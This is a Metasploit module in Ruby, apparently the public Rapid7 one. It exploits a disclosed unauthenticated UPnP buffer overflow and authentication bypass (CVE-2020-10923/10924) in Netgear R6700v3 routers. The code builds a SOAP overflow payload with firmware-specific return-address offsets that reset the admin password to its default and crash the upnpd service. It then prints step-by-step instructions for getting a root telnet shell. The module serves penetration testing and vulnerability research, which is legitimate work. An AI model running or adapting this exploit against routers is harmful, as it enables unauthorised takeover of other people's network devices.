##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Netgear R6700v3 Unauthenticated LAN Admin Password Reset',
        'Description' => %q{
          This module targets ZDI-20-704 (aka CVE-2020-10924), a buffer overflow vulnerability in the UPNP daemon (/usr/sbin/upnpd),
          on Netgear R6700v3 routers running firmware versions from V1.0.2.62 up to but not including V1.0.4.94, to reset
          the password for the 'admin' user back to its factory default of 'password'. Authentication is bypassed by
          using ZDI-20-703 (aka CVE-2020-10923), an authentication bypass that occurs when network adjacent
          computers send SOAPAction UPnP messages to a vulnerable Netgear R6700v3 router. Currently this module only
          supports exploiting Netgear R6700v3 routers running either the V1.0.0.4.82_10.0.57 or V1.0.0.4.84_10.0.58
          firmware, however support for other firmware versions may be added in the future.

          Once the password has been reset, attackers can use the exploit/linux/telnet/netgear_telnetenable module to send a
          special packet to port 23/udp of the router to enable a telnet server on port 23/tcp. The attacker can
          then log into this telnet server using the new password, and obtain a shell as the "root" user.

          These last two steps have to be done manually, as the authors did not reverse the communication with the web interface.
          It should be noted that successful exploitation will result in the upnpd binary crashing on the target router.
          As the upnpd binary will not restart until the router is rebooted, this means that attackers can only exploit
          this vulnerability once per reboot of the router.

          This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the Flashback team (Pedro Ribeiro +
          Radek Domanski).
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Pedro Ribeiro <pedrib[at]gmail.com>', # Twitter: @pedrib1337. Vulnerability discovery and Metasploit module
          'Radek Domanski <radek.domanski[at]gmail.com>', # Twitter: @RabbitPro. Vulnerability discovery and Metasploit module
          'gwillcox-r7' # Minor general updates plus updated implementation of the check method to identify a wider range of vulnerable targets.
        ],
        'References' => [
          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md'],
          [ 'URL', 'https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders'],
          [ 'CVE', '2020-10923'],
          [ 'CVE', '2020-10924'],
          [ 'ZDI', '20-703'],
          [ 'ZDI', '20-704']
        ],
        # Note that reliability isn't included here, as technically the exploit can only
        # only be run once, after which the service crashes.
        'Notes' => {
          'SideEffects' => [ CONFIG_CHANGES ], # This module will change the configuration by
          # resetting the router to the default factory password.
          'Stability' => [ CRASH_SERVICE_DOWN ] # This module will crash the target service after it is run.
        },
        'RelatedModules' => [ 'exploit/linux/telnet/netgear_telnetenable' ], # This module relies on users also running exploit/linux/telnet/netgear_telnetenable to get the shell.
        'DisclosureDate' => '2020-06-15',
        'DefaultTarget' => 0
      )
    )
    register_options(
      [
        Opt::RPORT(5000)
      ]
    )
  end

  def retrieve_version
    soap =
      '<?xml version="1.0"?>'\
      "\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"\
      "\r\n<SOAP-ENV:Body>"\
      "\r\nSetDeviceNameIconByMAC"\
      "\r\n<NewBlockSiteName>1"\
      "\r\n</NewBlockSiteName>"\
      "\r\n</SOAP-ENV:Body>"\
      "\r\n</SOAP-ENV:Envelope>"

    # the GetInfo method will helpfully report the firmware version to an unauth request
    headers = 'SOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo'

    res = send_request_cgi({
      'uri' => '/soap/server_sa',
      'method' => 'POST',
      'raw_headers' => headers,
      'data' => soap
    })

    if res.nil?
      fail_with(Failure::Unreachable, "Failed to obtain device version: Target didn't respond")
    elsif (res.body.to_s == '') || (res.code != 200)
      fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: Unexpected response code')
    end

    version = res.body.to_s.scan(/V(\d\.\d\.\d\.\d{1,2})/).flatten.first # Try find a version number in the format V1.2.3.48 or similar.
    if version.nil? # Check we actually got a result.
      fail_with(Failure::UnexpectedReply, 'Failed to obtain device version: no version number found in response') # Taken from https://stackoverflow.com/questions/4115115/extract-a-substring-from-a-string-in-ruby-using-a-regular-expression
    end
    Rex::Version.new(version) # Finally lets turn it into a Rex::Version object for later use in other parts of the code.
  end

  def check
    target_version = retrieve_version
    print_status("Target is running firmware version #{target_version}")
    if (target_version < Rex::Version.new('1.0.4.94')) && (target_version >= Rex::Version.new('1.0.2.62'))
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def find_offset
    target_version = retrieve_version
    if target_version == Rex::Version.new('1.0.4.84')
      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.")
      # this offset is where execution will jump to
      # a part in the middle of the binary that resets the admin password
      return "\x58\x9a\x03"
    elsif target_version == Rex::Version.new('1.0.4.82')
      print_status("#{peer} - Identified Netgear R6700v3 (firmware V1.0.0.4.82_10.0.57) as the target.")
      return "\x48\x9a\x03"
    end
  end

  def run
    offset = find_offset
    if !offset
      fail_with(Failure::NoTarget, 'Identified firmware version is not supported. Please contact the authors.')
    end

    headers =
      "SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\nSOAPAction: urn:NETGEAR-ROUTER:service:DeviceInfo:1#Whatever"

    payload =
      '<?xml version="1.0"?>'\
      "\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"\
      "\r\n<SOAP-ENV:Body>"\
      "\r\nSetDeviceNameIconByMAC"\
      "\r\n<NewBlockSiteName>1"

    # filler
    payload += Rex::Text.rand_text_alpha(1028)
    # $r4
    payload += Rex::Text.rand_text_alpha(4)
    # $r5
    payload += Rex::Text.rand_text_alpha(4)
    # $r6
    payload += Rex::Text.rand_text_alpha(4)
    # $r7
    payload += Rex::Text.rand_text_alpha(4)
    # $r8
    payload += Rex::Text.rand_text_alpha(4)
    # $lr (AKA return address)
    payload += offset

    # trailer
    payload +=
      "\r\n</NewBlockSiteName>"\
      "\r\n</SOAP-ENV:Body>"\
      "\r\n</SOAP-ENV:Envelope>"

    headers.gsub! "\n", "\r\n"
    payload.gsub! "\n", "\r\n"

    # MSF adds content len automatically.
    # Unfortunately this appears before the raw headers hash, but doesn't appear to have ill effects
    headers += "\r\n"

    res = send_request_cgi({
      'uri' => '/soap/server_sa',
      'method' => 'POST',
      'raw_headers' => headers,
      'data' => payload
    })

    if res
      # no response is received in case of success
      fail_with(Failure::UnexpectedReply, 'Failed to send HTTP payload... try again?')
    else
      print_good("#{peer} - HTTP payload sent! 'admin' password has been reset to 'password'")
      print_status('To achieve code execution, do the following steps manually:')
      print_status("1- Login to #{rhost} with creds 'admin:password', then:")
      print_status("\t1.1- go to Advanced -> Administration -> Set Password")
      print_status("\t1.2- Change the password from 'password' to <WHATEVER>")
      print_status('2- Run metasploit as root, then:')
      print_status("\t2.1- use exploit/linux/telnet/netgear_telnetenable")
      print_status("\t2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>")
      print_status("\t2.3- set rhost #{rhost}")
      print_status("\t2.3- set username admin")
      print_status("\t2.4- set password <WHATEVER>")
      print_status("\t2.5- OPTIONAL: set timeout 1500")
      print_status("\t2.6- OPTIONAL: set MAC <ROUTERS_MAC>")
      print_status("\t2.7- run it and login with 'admin:<WHATEVER>'")
      print_status('3- Enjoy your root shell!')
    end
  end
end
